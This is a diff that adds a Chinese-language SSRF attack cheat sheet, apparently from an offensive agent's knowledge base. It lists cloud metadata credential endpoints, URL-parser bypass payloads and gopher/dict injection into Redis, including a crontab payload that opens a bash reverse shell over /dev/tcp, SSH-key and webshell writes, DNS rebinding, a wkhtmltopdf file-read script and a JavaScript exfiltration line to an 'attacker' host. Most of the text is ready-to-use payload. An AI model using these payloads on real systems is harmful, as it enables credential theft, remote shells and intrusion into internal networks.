@@ -1,0 +1,120 @@
+# SSRF 进阶专题
+
+> 云元数据全目录、URL 解析器差异、gopher/dict 注入、DNS 重绑定、PDF 生成器 SSRF、内网服务利用。
+> 基础速查见 web-vulnerabilities.md §1.3。
+
+---
+
+## 1. 攻击面与 IP 绕过
+
+**参数**：loc/url/path/endpoint/imageUrl/dest/redirect/uri/callback/load/file/resource/src。**非显式**：PDF/截图生成、Webhook、CSV/RSS 导入、OAuth redirect_uri、X-Forwarded-Host、XXE 实体、GraphQL `@link`。参数名补充变体：share/wap/link/target/u/3g/display/sourceURL/imageURL/domain。
+
+**确认**：interactsh 回调 → 时间差（开放端口快/关闭慢）→ localhost 端口清单（8080/22/6379/9200/5984/**2375 Docker**/4840）→ 错误差异（not found vs refused vs timeout 摸拓扑）。
+
+**file 协议内网横向三步**（无回显限制时的标准链）: ①`file:///etc/hosts` 看本机网卡/网段 → ②`file:///proc/net/arp` 读 ARP 缓存表拿存活内网主机（python 循环替换末位 1-254 爆网段同理） → ③`dict://<内网IP>:<port>` 逐端口探测开放服务（python 并发循环 1-65535）→ 定位 Redis/FastCGI 等再用 gopher 打。Windows 路径 `file://D:/images/1.png`（盘符即 host 位）。
+
+**localhost 变体**：`127.1`｜`127.000.000.001`｜`0x7f000001`｜`2130706433`｜`0177.0000.0000.0001`｜`[::]`/`[::1]`/`[::ffff:127.0.0.1]`。
+**元数据变体**：`2852039166`｜`0xa9fea9fe`｜`0251.0376.0251.0376`｜`[::ffff:169.254.169.254]`｜`[fd00:ec2::254]`｜`*.nip.io`。
+
+## 2. 云元数据目录
+
+| 云 | 端点 | 认证 |
+|---|---|---|
+| AWS IMDSv1 | `169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]`、user-data、public-keys | 无（最高危） |
+| AWS IMDSv2 | PUT `/latest/api/token`（TTL 头）→ GET + token 头 | SSRF 支持自定义头即绕过；重绑定从实例自身打无 XFF |
+| AWS ECS | `169.254.170.2/v2/credentials/<GUID>`（GUID 在 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI） | 无 |
+| Lambda | `file:///proc/self/environ`（AK/SK/Token） | — |
+| GCP | `metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`；`?recursive=true` 全量；`v1beta1` 可能免头 | `Metadata-Flavor: Google` |
+| Azure | `169.254.169.254/metadata/instance`、`/identity/oauth2/token?resource=https://management.azure.com/`；App Service 是 `169.254.130.1` | `Metadata: true` |
+| 阿里云 | `100.100.100.200/latest/meta-data/`、`ram/security-credentials/[ROLE]` | 无 |
+| OCI | `169.254.169.254/opc/v1/instance/`、`/identity/key.pem` | `Authorization: Bearer Oracle` |
+| DO/Hetzner/OpenStack | `169.254.169.254/metadata/v1/`、`/hetzner/v1/metadata`、`/openstack/latest/meta_data.json` | 无 |
+
+**K8s**：`file:///var/run/secrets/kubernetes.io/serviceaccount/token`｜`kubernetes.default.svc/api/v1/namespaces/kube-system/secrets`｜kubelet `NODE_IP:10255/pods`（常免认证）｜etcd `NODE_IP:2379/v2/keys/registry/secrets/`（极危）｜kubectl proxy `127.0.0.1:8001`。
+
+## 3. URL 解析器差异
+
+过滤器与 HTTP 客户端解析不一致 → 过滤看 safe.com、实际连 evil.com：
+
+| 技巧 | Payload | 差异点 |
+|---|---|---|
+| @userinfo | `http://safe.com:80@evil.com/`、`http://safe.com%00@evil.com/` | 正则见 safe.com，解析器取 evil.com |
+| 反斜杠 | `http://evil.com\@safe.com/` | PHP 取 safe.com；Node/cURL 把 `\` 当 `/` 连 evil.com |
+| fragment | `http://evil.com#@safe.com/` | # 后是 fragment，host=evil.com |
+| 空字节 | `%00` 截断 | Python/PHP/老 cURL 截断见 safe.com |
+| IPv6 映射 | `[::ffff:127.0.0.1]` | 滤 IPv4 不滤 IPv6 |
+| 三斜杠 | `file://evil.com/x` | Windows cURL 走 SMB |
+
+**补充**：全角/带圈 Unicode（`①②⑦.⓪.⓪.①`）｜hex/octal 字节（`0x7f.0x0.0x0.0x1`）｜开放重定向链/短链接（trusted.com 302 → 内网）｜CRLF 注入头（`/%0D%0AHost:%20169.254.169.254`）｜HTTPS 站 302 到 HTTP 降级｜多重 @（`http://a.com@b.com@c.com/`）PHP parse_url 取**最后一个** @ 后（c.com）而 libcurl 取**第一个** @ 后（b.com）——校验器与请求器分属两套解析时定向错位。
+
+### urljoin 可控 base（Python `urllib.parse.urljoin`）
+
+**触发场景**: `fetch(urljoin(base, resource))` 结构且 `base` 来自用户输入（session 值/请求参数），`resource` 为固定字符串。首层 `urljoin(API_BASE, account)` 中 account 可控即 base 可控。前提: `urlopen` 默认装 FileHandler，`file://` 可直接读。
+
+**三性质**（urljoin 属标准库 `urllib.parse`，无需安装; 性质由 RFC 3986 相对引用解析 + Python 的 `uses_relative` 列表决定，Python 3 全系一致）:
+
+| 性质 | 实例 | 结果 |
+|---|---|---|
+| 绝对 URL 直接替换 | `urljoin("https://x/api/", "file:///a/b")` | `file:///a/b`（scheme 不同直接返回后者） |
+| 同名段自反 | `urljoin("file:///a/b/permissions", "permissions")` | `file:///a/b/permissions`（relative 替换最后一段，同名=读回自身） |
+| 去尾拼接 | `urljoin("file:///tmp/users/x", "user/settings")` | `file:///tmp/users/user/settings`（= dirname(base.path) + relative） |
+
+**落点计算法**: relative 的每一段都落在 dirname(base.path) 之下。已知固定 resource（如 `user/settings`、`permissions`）时，反推 `base.path` 的取值使最终读取点对齐自己可控的写入路径（如上传接口能写的 `/tmp/users/<acct>/<name>` 两级路径）——先列上传可写路径集合，再解 base 使 `dirname(base)+resource` ∈ 该集合。
+
+**负知识**: `data:` 不在 Python `uses_relative` 列表 → `urljoin(data_url, relative)` **丢弃 base** 返回 relative 原文 → `urlopen` 报 `unknown url type`——data: URL 无法作为可控 base 使用。`file` 在 uses_relative 中，相对解析正常。
+
+## 4. gopher:// 与 dict://
+
+格式：`gopher://HOST:PORT/_<URL编码数据>`（`_` 被丢弃）。编码 `\r`→%0D、`\n`→%0A、空格→%20；端点先解码一次则双重编码 `%250D%250A`。libcurl 发送时对**整个 selector** 百分号解码——请求行/头中的字面 `%XX` 线上会被解码变形（`GET /a%20b` 线上变 `GET /a b`，损坏请求行），需线上保留时写 `%25XX` 或用构造器对头部做 `%` 二次编码。libcurl 在 selector 后**固定追加一个 CRLF**——无 body 请求恰好补成头块空行; 带 body 请求 body 后多 2 字节 CRLF（HTTP 按 CL 读取无影响）。
+
+- **Redis 写 crontab**：FLUSHALL → SET 1 `"\n\n*/1 * * * * bash -i >& /dev/tcp/A/4444 0>&1\n\n"` → CONFIG SET dir /var/spool/cron/ + dbfilename root → SAVE（限定: ubuntu/debian 下写 crontab 反弹常失败——crontab 实现差异，CentOS 成功率高; gopher 手工拼包时 RESP `$N` 长度须随 payload 实际字节数同步改）
+- **Redis 写 SSH key**：dir /root/.ssh/ + authorized_keys；**写 webshell**：dir /var/www/html/ + shell.php
+- **MySQL**（空密码/skip-grant）：认证包；**SMTP**（25）：HELO/MAIL FROM/DATA 全流程；**FastCGI**（9000）：PHP_VALUE=auto_prepend_file=php://input；**Memcached**（11211）：stats / 伪造 session
+- **Gopherus 自动生成**：`--exploit mysql|redis|fastcgi|smtp`
+- **gopher 协议六坑**（version-sensitive）: ①curl<7.45 会截断 payload 中的 %00（FastCGI EXP 含 %00，需 libcurl≥7.45）②PHP curl 默认不跟随 302（需 CURLOPT_FOLLOWLOCATION 显式开启）③file_get_contents() 场景的 gopher payload 不能 URL 编码（与 curl 相反）④file_get_contents() 跟随 302 到 gopher 有 BUG 常失败——探测 SSRF sink 类型（curl vs file_get_contents）决定编码与跳转策略 ⑤**Content-Length 虚大陷阱**（libcurl）: libcurl 发送 selector 前对其做百分号解码——body 中的 `%XX`（3 字符）线上只占 1 字节，手工按编码前字符串计算 CL 会虚大 → 服务端按 CL 永久等待 body，症状为 SSRF 目标"挂起"（fetcher 超时、0 字节、无响应头），与请求行/头/内容无关且必然复现。防护: CL 按**解码后**字节数计算（`len(unquote_to_bytes(body))`——`unquote_to_bytes` 与 libcurl percent-decode 对齐: 任意 `%XX` 含非 UTF-8 字节按单字节还原、非法十六进制序列原样保留、`+` 不转换; **禁用 str 版 `unquote()`**——非 UTF-8 字节会被替换成 U+FFFD 重编码为 3 字节，CL 虚大重现挂起）; 或 body 避开 `%` 字符（JSON body 经 `json.dumps` 产出不含 `%XX`，天然安全）; 或直接用 `$AGENT_DIR/scripts/web_helpers.py` 的 `build_gopher_url`（自动修正 CL 且对请求行/头 `%` 二次编码，坑结构性消除）。**验证同构性规则**: webhook 字节级验证所用 body 必须与实战载荷**字符集同构**——验证 body 不含 `%XX` 而实战含时，"验证通过"不能证明编码路径正确（伪验证，错误结论会掩盖真根因） ⑥**libcurl ≥ 8.22.0 selector CR/LF 拒绝**（2026-09 发布）: 该版本起解码后校验 gopher selector，含 CR/LF 直接 `CURLE_URL_MALFORMAT` 拒绝（`curl: (3) Bad gopher selector, CR or LF not allowed`; TCP 连接已建立但 0 字节发出即关闭——对端口探测仍表现为"开放"）——SSRF fetcher 跑新版 libcurl 时 gopher 构造 HTTP 请求的整条技法失效（①-⑤ 全部不可达），探测时先从 webhook UA 里的 libcurl 版本号确认; 本地验证产物须用 <8.22.0 的 curl 或裸 socket 客户端（python 直连发送）——新版 curl 会把一切构造产物 rc=3 拒掉，易误判为载荷构造错误
+- **302 协议升级**: 过滤只允许 http(s) 前缀时，可控服务器 302 `Location: gopher://127.0.0.1:port/...`（或 file:///dict://）——curl 跟随跳转不检查目标协议（除非 CURLOPT_PROTOCOLS 限制）; Discuz X3.2 `forum.php?mod=ajax&action=downremoteimg&message=[img]http://evil/test.php?a.jpg[/img]` 远程图拉取即此模式
+
+**file 协议与伪协议头**: ①curl 的 `file://任意host/path` 仍读本地文件（host 被忽略）——过 host 白名单后拼 `?` 截断尾部自动补的 `/`（`file://www.baidu.com/etc/flag?`）②file_get_contents() 把不认识的伪协议头当文件夹名，`httpsssss://../../../../etc/passwd` 即相对路径跨目录读（报错路径确认解析行为）
+
+**dict://**：`dict://127.0.0.1:6379/INFO`、`CONFIG:SET:dir:...`、`SET:key:...`、`BGSAVE`。其他：sftp://（收凭据哈希）、ldap://、ftp://。
+
+## 5. DNS 重绑定
+
+**流程**：解析得公网 IP 过检 → TTL=0 → 实际请求时重解析得内网 IP。
+
+**前提（TOCTOU 两次解析）**：`http_get(hostname)`（库内重解析）✅ 可利用；`http_get(ip)`（用已解析 IP）❌ 不可利用。
+
+**工具**：`rbndr.us`（`7f000001.01020304.rbndr.us` 交替返回）、ceye.io、singularity（nccgroup）、dnslib 自建 TTL=0。缓存场景用并发竞争。**浏览器侧**：同源 JS 在重解析后读内网响应（0.0.0.0=localhost、CNAME 链）。**K8s 案例**：CVE-2020-8555（glusterfs/quobyte provisioner SSRF）→ 修复绕过 CVE-2020-8562（重绑定）。
+
+## 6. PDF 生成器与内网利用
+
+| 生成器 | 触发 |
+|---|---|
+| wkhtmltopdf | iframe/img/link/@import/JS document.write；`file:///etc/passwd`；JS 同步 XHR `file://`（比 iframe 稳定） |
+| WeasyPrint | CSS url()；`<link rel="attachment" href="file:///etc/passwd">`（文件嵌入 PDF） |
+| Chrome Headless | 完整 JS：fetch 内网渲染进 body；WebSocket 探端口；dns-prefetch OOB |
+| PhantomJS | page.open() |
+
+**wkhtmltopdf 0.12.5 (Qt 4.8.7) 行为细节**: JS 同步 XHR 读文件首选——``<script>x=new XMLHttpRequest;x.open("GET","file:///flag.txt",false);x.send();document.write("<pre>"+x.responseText+"</pre>")</script>``。边界: 目录列举报 `NETWORK_ERR: XMLHttpRequest Exception 101`（仅放行普通文件）; `/proc/*`（cmdline/environ）读出空（size=0 文件）。错误 oracle: 渲染失败时接口常 500 并回显 wkhtmltopdf stderr（如 ``render failed: Exit with code 1 due to network error: ContentNotFoundError``）——可做文件存在性判定与失败原因定位。iframe 不稳定: 同 payload 有时 `ContentNotFoundError` 有时静默空白，不作首选载体。data: URI 子资源有效: base64 必须完整——截断的 base64 报 `ContentNotFoundError`，易误判为"子资源被禁"。原始 body 即文档: 部分实现把整个请求体写临时文件当主文档渲染（非法 JSON 也渲染）——body 中的 JSON 结构噪音用 `<style>` 隐藏，或直接发纯 HTML body。
+
+**输出不可见外带**：`new Image().src='http://attacker/exfil?data='+btoa(t)`；长数据切 60 字节进 DNS 子域。**UA 指纹**：wkhtmltopdf/HeadlessChrome/PhantomJS/WeasyPrint。**DevTools 9222 暴露**：`/json` 列目标 → WebSocket 全控。
+
+**内网服务**：Docker 2375（create + Binds 宿主逃逸）｜ES 9200（`_cat/indices`、`_search?q=*`）｜Spring actuator（`/env`、`/shutdown`）｜管理面板 8080/admin。
+
+**WebLogic CVE-2014-4210**：`/uddiexplorer/SearchPublicRegistries.jsp?operator=http://内网:端口` 响应差异探端口；CRLF 打 Redis（`operator=http://REDIS:6379/test%0D%0A%0D%0Aset...`）。
+
+**WooYun 触发点**：URL 代理/转发、图片加载、截图/PDF、Webhook、导入、OAuth 回调。**代理配置不当**：Web Server 代理未限目标 → 经代理达内网。**信息链**：主机发现 → 未授权面板 → 未认证 Redis → Docker 逃逸 → 元数据凭据 → C 段横向。
+
+
+## N. 校验实现与协议走私增补
+- **Cloudflare Image Resizing 307 gadget**: 目标域开了图片转换（有 `/cdn-cgi/image/` 路径即开）时，`https://目标域/cdn-cgi/image/onerror=redirect/<source-url>` 在 source image 转换失败时返回 **307 Location 指向 source-url 本身**——从 allowlisted 域拿到方向可控重定向。约束: source-url 必须同 zone（子域可，跨 zone 忽略）。利用: ① SSRF 白名单按 host 过滤 + `follow_location` 开（PHP file_get_contents 默认跟 20 跳）时，Location 里塞反斜杠差异 URL（`http://白名单域\@127.0.0.1/api`——WHATWG 解析 `\` 当 `/` 判 host 在 zone 内放行 307，PHP 跟随后把 `\@` 前当 userinfo 连 127.0.0.1，绕 loopback REMOTE_ADDR 检查）; ② CSPT（客户端路径穿越）链: 307/308 保留 method/body/headers，`fetch(baseUrl + userInput)` 类前端把请求经 gadget 转发到任意子域（cookie 认证场景有效，Authorization 头浏览器跨源不转发）
+- **curl 重定向溢出**: CURLOPT_MAXREDIRS 超限后错误分支拿 CURLINFO_REDIRECT_URL 无校验再请求——重定向链恰好超限即打内网
+- **白名单正则未转义点**: `meepwntube.0x1337.space`（. 未转义）→ 注册 meepwntubex0x1337.space + A→127.0.0.1
+- **SNI 明文走私**: TLS ClientHello 的 SNI 是明文——对"解析原始字节"的服务（
+/\x00 当终止符的 FTP）构造 hostname 使 SNI 字节构成合法命令；浏览器拒说目标协议时的信道
+- **PHP SoapClient gadget**: user_agent/uri CRLF 走私 + 反序列化后任意方法调用触发 __call() 发请求——unserialize 入口+方法调用点即 SSRF（内置类无依赖）
+- **凭据跟随泄露**: 服务端 fetch 用户 URL 且客户端库默认带 Authorization → nc 监听即收 Basic 凭据
+- **WeasyPrint attachment**: `<a/link rel="attachment" href>` 独立 fetch 路径——file:// 读文件嵌 PDF（pdfdetach 提取）/ 200 则 PDF 含 /Type /EmbeddedFile 作盲 oracle（CVE-2024-28184）
+- **Docker API 细节**: GET-only SSRF 时 `/containers/<id>/archive?path=/flag.txt` 直接读容器文件（tar 格式）; POST 需内网请求转发端点中继 exec 创建+启动（id 见 sst/内存库）
+
+**Python idna 转换段绕 hostname 三重检查**: 校验 host→逐标签 encode('idna').decode('utf-8')→再校验→urlopen 的结构——第一次传含 Unicode 字符（如 ℭ U+212D）host，转换后标签变目标 ASCII（cℭ→cc）通过末次检查; 枚举脚本: 遍历 U+128-65536 找 encode('idna') 结果含目标字母且无 - 的码点（Chrome 侧 IDNA 全角归一化见 xss-advanced）; **增补行**: curl .netrc 凭据在跨伺服重定向 + 401 WWW-Authenticate Basic 时转发给 B（CVE-2025-0167）; Python urlsplit("<URL:http://...>") scheme 为空但 urlretrieve 照抓（校验器/执行器解析差; 换行前缀变体）; Uvicorn（FastAPI 默认 ASGI）响应头不滤 CRLF——未修复 n-day（头注入/缓存投毒/XSS）; CherryPy RFC 2047 头解码引入 CRLF 请求拆分; Waitress 非法 method 报错回显可外带 cookie（CRLF 把 cookie 挪到 method 位）。
